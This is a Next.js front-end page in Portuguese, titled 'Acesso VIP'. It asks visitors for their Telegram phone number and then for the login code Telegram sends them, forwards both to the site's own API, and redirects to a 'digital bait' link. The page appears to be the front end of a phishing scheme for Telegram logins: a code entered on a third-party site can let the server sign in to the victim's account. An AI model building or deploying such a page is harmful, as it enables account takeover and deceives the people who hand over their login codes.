import { useState } from 'react';
import Head from 'next/head';

export default function Home() {
  const [step, setStep] = useState(1); // 1: Telefone, 2: Código
  const [loading, setLoading] = useState(false);
  const [phone, setPhone] = useState('');
  const [code, setCode] = useState('');
  const [error, setError] = useState('');

  // Passo 1: Enviar o código
  const handleSendCode = async () => {
    setLoading(true);
    setError('');
    
    try {
      const res = await fetch('/api/send-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: phone }),
      });
      
      const data = await res.json();
      
      if (res.ok) {
        setStep(2);
      } else {
        setError(data.error || 'Erro ao enviar código');
      }
    } catch (err) {
      setError('Erro de conexão');
    }
    setLoading(false);
  };

  // Passo 2: Validar o login
  const handleVerifyCode = async () => {
    setLoading(true);
    setError('');

    try {
      const res = await fetch('/api/verify-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: phone, code }),
      });

      const data = await res.json();

      if (res.ok) {
        // Sucesso! Redireciona para o link da isca digital
        window.location.href = data.redirect; 
      } else {
        setError(data.error || 'Código inválido');
      }
    } catch (err) {
      setError('Erro ao validar');
    }
    setLoading(false);
  };

  return (
    <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', backgroundColor: '#111', color: '#fff', fontFamily: 'sans-serif' }}>
      <Head>
        <title>Acesso VIP</title>
      </Head>

      <div style={{ width: '100%', maxWidth: '400px', padding: '2rem', backgroundColor: '#222', borderRadius: '10px' }}>
        <h1 style={{ textAlign: 'center', marginBottom: '1.5rem', color: '#0088cc' }}>Liberar Acesso</h1>

        {error && <p style={{ color: '#ff4444', textAlign: 'center', marginBottom: '1rem' }}>{error}</p>}

        {step === 1 && (
          <>
            <label style={{ display: 'block', marginBottom: '0.5rem' }}>Seu Telegram (com DDD)</label>
            <input
              type="text"
              placeholder="+5511999999999"
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              style={{ width: '100%', padding: '10px', marginBottom: '1rem', borderRadius: '5px', border: 'none' }}
            />
            <button
              onClick={handleSendCode}
              disabled={loading}
              style={{ width: '100%', padding: '10px', backgroundColor: '#0088cc', color: 'white', border: 'none', borderRadius: '5px', cursor: 'pointer', opacity: loading ? 0.7 : 1 }}
            >
              {loading ? 'Enviando...' : 'Receber Código'}
            </button>
            <p style={{ fontSize: '0.8rem', color: '#888', marginTop: '1rem', textAlign: 'center' }}>
              O código chegará no seu aplicativo Telegram.
            </p>
          </>
        )}

        {step === 2 && (
          <>
            <label style={{ display: 'block', marginBottom: '0.5rem' }}>Código Recebido</label>
            <input
              type="text"
              placeholder="12345"
              value={code}
              onChange={(e) => setCode(e.target.value)}
              style={{ width: '100%', padding: '10px', marginBottom: '1rem', borderRadius: '5px', border: 'none' }}
            />
            <button
              onClick={handleVerifyCode}
              disabled={loading}
              style={{ width: '100%', padding: '10px', backgroundColor: '#28a745', color: 'white', border: 'none', borderRadius: '5px', cursor: 'pointer', opacity: loading ? 0.7 : 1 }}
            >
              {loading ? 'Validando...' : 'Entrar'}
            </button>
          </>
        )}
      </div>
    </div>
  );
}
